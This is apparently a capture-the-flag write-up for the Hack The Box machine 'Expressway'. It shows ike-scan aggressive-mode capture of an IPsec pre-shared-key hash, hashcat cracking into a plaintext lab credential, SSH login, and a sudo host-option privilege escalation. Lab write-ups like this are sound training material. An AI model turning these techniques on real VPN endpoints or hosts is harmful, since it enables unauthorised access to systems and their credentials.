<!--![[Screenshot 2025-11-09 201848.png]]-->
![ExpresswayScreenshot](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/Screenshot%202025-11-09%20201848.png)

### Nmap Scan

SSH

![ExpresswayNmap1](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/nmap1.png)

ISAKMP (Internet Security Association and Key Management Protocol)

![ExpresswayNmap2](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/nmap2.png)

Finding the right nmap scan is the hardest part of this machine. I spent more than an hour to check the open ports. I easily got the SSH port but for the Port 500, it takes me around 30 minutes to find it since it is a udp port and running `-p-` returns a lot of RTTVAR error. Maybe because there a lot of players who are brute-forcing the ssh service.


### ike-scan

After I found the port 500 which runs an isakmp service, I used ike-scan to check the handshake and enumerate the service.

```
┌──(kali㉿kali)-[~/Desktop/HTB_Machines]
└─$ ike-scan -M  10.10.11.87 
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Main Mode Handshake returned
        HDR=(CKY-R=085a392ff4c5d619)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.965 seconds (1.04 hosts/sec).  1 returned handshake; 0 returned notify
```

![Expressway_ikescan1](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/ikescan1.png)


### Getting the hash and username:
```
┌──(kali㉿kali)-[~/Desktop/HTB_Machines/Expressway]
└─$ ike-scan -A -M --pskcrack=hash.txt 10.10.11.87   
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=af1ef8a8b689e03f)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 1.801 seconds (0.56 hosts/sec).  1 returned handshake; 0 returned notify
```

![Expressway_ikescan2](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/ikescan2.png)

I saved the hash as `hash.txt`, then used hashcat for offline cracking.

![Expressway_hashcat1](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/hashcat1.png)

### Hashcat Result:

ike@expressway.htb:freakingrockstarontheroad

![Expressway_hashcatresult](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/hashcatresult.png)


## User Flag


After getting the credentials, I logged in to the SSH service to capture the `user.txt` flag.

![Expressway_sshlogin](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/sshlogin_and_userflag.png)


## Root Flag

### Privilege Escalation

To escalate my privileges, I enumerated the binaries running in the machine using this command:

```
ps aux
```

Vulnerable binary:

```
root       10763  0.0  0.1  22012  7816 pts/0    S+   11:12   0:00 /usr/local/bin/sudo -h offramp.expressway.htb ./bash
```

![Expressway_privescvector](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/privescvector.png)


I executed the binary to get a root access and capture the root flag:

![Expressway_privesc](https://github.com/NightCrypt3670/cybersecurity-projects-and-hacktivities/blob/main/HTB_Machines_Walkthrough/Expressway/Assets/privesc.png)


And that's it... Happy Hacking!!!
